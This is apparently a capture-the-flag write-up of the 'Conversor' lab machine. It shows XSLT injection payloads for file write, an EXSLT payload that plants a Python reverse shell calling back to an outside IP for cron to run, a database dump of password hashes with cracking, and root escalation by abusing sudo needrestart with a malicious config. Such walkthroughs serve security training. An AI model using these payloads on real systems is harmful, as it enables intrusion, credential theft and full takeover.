---
created: 2026-03-13
modified: 2026-03-13
---

#xslt

![[Pasted_image_20251026214019.png]]

## Port scan 

```bash
Warning: 10.129.132.160 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.132.160
Host is up (4.8s latency).
Not shown: 62567 closed tcp ports (reset), 2966 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://conversor.htb/
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 163.19 seconds
```

we have a login page at port `80` and the option to create an account.

![[Pasted_image_20251026215352.png]]

created an account and logged in and got this.

![[Pasted_image_20251026215749.png]]


We can upload both XML and XSLT. Two attack surfaces we have here. We XSLT first because XSLT transforms typically present a richer, higher-risk attack surface than plain XML: XSLT processors expose powerful features which often lead to file read, SSRF, code execution etc.

### XSLT

[XSLT PayloadAllThings](https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/#summary)

We can check the vendor and version using

```xslt
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
 <xsl:value-of select="system-property('xsl:vendor')"/>
 <xsl:value-of select="system-property('xsl:version')" />
  </xsl:template>
</xsl:stylesheet>
```

Create an XML file for upload the contents of the file doesn't won't affect our payload.

![[Pasted_image_20251101074447.png]]

we get the vendor is `libxslt` version `1.0`.

Testing for file read

```xslt
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

We get the error 

![[Pasted_image_20251101074916.png]]

Testing File write. 

```xslt
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common" 
  extension-element-prefixes="exploit"
  version="1.0">
  <xsl:template match="/">
    <exploit:document href="evil.txt" method="text">
      Hello World!
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

Getting the error 
![[Pasted_image_20251101080159.png]]

seems like a permission error.. Lets try to upload to `/var/www/html` or `/var/www/html/converser` because that is where most applications run from.. `converser` is the application name it can vary.

We just need to update  this part 

```xslt
<exploit:document href="/var/www/html/evil.txt" method="text">
    Hello World!
</exploit:document>
```

We are not getting the error we were getting. But trying to visit `/evil.txt` i get 404

![[Pasted_image_20251101081652.png]]

Maybe we try adding the application name to the path we are writing to. `/var/www/html/conversor`

It still fails

![[Pasted_image_20251101082209.png]]

But definitely we know that we can write files.. and with that we can write a reverse shell in the web root and visit `/shell` to execute it. 

In `payloadallthings` we have code execution payloads but they vary based on the language used in the application.

One of the tricks i use if `wappalyzer `fails is checking the structure of the cookies

![[Pasted_image_20251101082558.png]]

This tells us this is a flask application.

At `/about` we can download the source code 

![[Pasted_image_20251101083936.png]]

we get a .tar.gz file .. extracting the contents we get three file and reading `app.py` i get this 

```python
[SNIP]

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = '/var/www/conversor.htb/instance/users.db'
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

[SNIP]
```

We have the path `/var/www/conversor.htb/` but it is not the base dir because visiting the path `http://conversor.htb/instance/users.db` i get 404

We also have a markdown file `install.md`

we get this note 

```md
If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

We cab create python scripts at `/var/www/conversor.htb/scripts`. We also know that there might be a crontab executing .py files in the `/scripts` directory after every minute.

We can use the following payload to get a reverse shell

```xslt
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exslt="http://exslt.org/common"
  extension-element-prefixes="exslt">
  <xsl:template match="/">
    <exslt:document href="/var/www/conversor.htb/scripts/revshell.py" method="text">
import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.170",1337))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
    </exslt:document>
    <p>Reverse shell written. Wait up to 60s for cron trigger...</p>
  </xsl:template>
</xsl:stylesheet>
```


We get shell as `www-data`

```bash
rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.170] from (UNKNOWN) [10.10.11.92] 41376
www-data@conversor:~$ whoami
whoami
www-data
www-data@conversor:~$
```


We already know there is `users.db` file.

```bash
www-data@conversor:~/conversor.htb/instance$ file users.db
file users.db
users.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 20, database pages 6, cookie 0x2, schema 4, UTF-8, version-valid-for 20
```


Dumping the database i get this 

```bash
www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db .dump
sqlite3 users.db .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    );
INSERT INTO users VALUES(1,'fismathack','5b5c3ac3a1c897c94caad48e6c71fdec');
INSERT INTO users VALUES(5,'dark','a82fd95db10ff25dfad39f07372ebe37');
INSERT INTO users VALUES(6,'pwnflakes','21232f297a57a5a743894a0e4a801fc3');

[SNIP]
```

Two hashes crack 

![[Pasted_image_20251101095144.png]]

dark is the user i registered and most probably pwnflakes is another ctf player

checking user in the machine i get this 

```bash
www-data@conversor:~/conversor.htb/instance$ cat /etc/passwd | grep sh$
cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
fismathack:x:1000:1000:fismathack:/home/fismathack:/bin/bash
```

We can login with the cracked password

```bash
fismathack@conversor:~$ id
uid=1000(fismathack) gid=1000(fismathack) groups=1000(fismathack)
```

We can run needstart as root

```bash
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

Checking the version we get

```bash
fismathack@conversor:~$ sudo /usr/sbin/needrestart --version

needrestart 3.7 - Restart daemons after library updates.
```

There are known exploits for this but there is a simpler way of getting root shell by exploiting the conf file.

```bash
fismathack@conversor:/tmp$ echo 'exec "/bin/sh","-p";' > /tmp/con.conf
fismathack@conversor:/tmp$ sudo /usr/sbin/needrestart -c /tmp/con.conf
# cd ~
# cat root.txt
48722df5633b4072bd6f188f7c3db9ca
```





